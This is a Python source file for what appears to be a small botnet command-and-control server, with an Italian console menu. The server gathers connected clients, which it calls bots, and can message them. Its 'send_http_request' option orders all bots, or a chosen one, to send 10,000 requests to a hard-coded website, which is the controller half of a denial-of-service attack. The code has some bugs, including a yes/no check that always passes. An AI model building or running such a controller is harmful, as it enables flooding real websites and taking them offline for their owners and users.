import concurrent
import socket
from asyncio import Event
from concurrent.futures import ThreadPoolExecutor

import requests

server_address = ('localhost', 15200)
clients = []


def initialize(e):
    """
    Initialize the server and listen for incoming connections.
    The server will listen on the port specified in server_address and
    will accept up to 5 client connections.
    """
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((server_address[0], server_address[1]))
    s.listen(5)
    s.settimeout(2)
    print(f'Server is listening on port {server_address[1]}')
    while not e.is_set():
        try:
            client, address = s.accept()
            clients.append((client, address))
            print(f'Client connected: {address}')
            data = client.recv(1024)
            print(data.decode('utf-8'))
        except socket.timeout:
            continue


def start_server():
    """
    Start a thread for the server and a thread to handle console input.
    It will wait for both threads to finish before exiting the program.
    """
    event = Event()
    with ThreadPoolExecutor(max_workers=2) as executor:
        x = executor.submit(initialize, event)
        y = executor.submit(handle_console, event)

        # Check if both threads are done
        concurrent.futures.wait([x, y], return_when=concurrent.futures.FIRST_COMPLETED)

        executor.shutdown(wait=False)


def handle_console(e):
    """
    Handle console input from the user.
    """
    while not e.is_set():
        print("1. Mostra tutti i client connessi")
        print("2. Invia messaggio a tutti i client")
        print("3. Invia messaggio a un client specifico")
        print("4. Effettua richieste http")
        print("0. Exit")
        scelta = int(input())

        match scelta:
            case 1:
                get_all_clients()
            case 2:
                send_message_to_all_clients()
            case 3:
                send_message_to_specific_client()
            case 4:
                send_http_request()
            case 0:
                print("Exiting...")
                e.set()
                return
            case _:
                print("Scelta non valida")


def get_all_clients():
    """
    Print all the clients connected to the server
    """
    if len(clients) == 0:
        print("Nessun client connesso")
        return

    for key, client in enumerate(clients):
        print(f'Client {key + 1}: {client[1]}')


def send_message_to_all_clients():
    """
    Send a message to all the clients connected to the server
    """
    if len(clients) == 0:
        print("Nessun client connesso")
        return

    msg = input("Inserisci il messaggio da inviare: ")
    for client in clients:
        client[0].send(bytes(msg, 'utf-8'))
        print(f'Sent to {client[1]}')


def send_message_to_specific_client():
    """
    Send a message to a specific client connected to the server
    """
    if len(clients) == 0:
        print("Nessun client connesso")
        return

    client_address = int(input("Inserisci l'address del client a cui vuoi mandare il messaggio: "))

    if client_address not in [client[1][1] for client in clients]:
        print("Client non trovato")
        return

    msg = input("Inserisci il messaggio da inviare: ")
    client = [client for client in clients if client[1][1] == client_address][0]
    client[0].send(bytes(msg, 'utf-8'))
    print(f'Sent to {client[1]}')


def send_http_request():
    """
    Send an HTTP request to the specified URL
    """

    url = 'https://marcorealacci.me'
    myobj = {
        'url': url,
        'number_of_requests': 10000
    }

    if len(clients) == 0:
        print("Nessun client connesso")
        return

    if input("Voi utilizzare tutti i bot connessi? S/N: ") == "S" or "s":
        for client in clients:
            requests.post(f"http://{client[1][0]}:80", json=myobj)
    else:
        client_address = int(input("Inserisci l'address del client a cui vuoi mandare il messaggio: "))
        if client_address not in [client[1][1] for client in clients]:
            print("Client non trovato")
            return
        else:
            client = [client for client in clients if client[1][1] == client_address][0][1][0]
            requests.post(f"http://{client}:80", json=myobj)


if __name__ == '__main__':
    start_server()
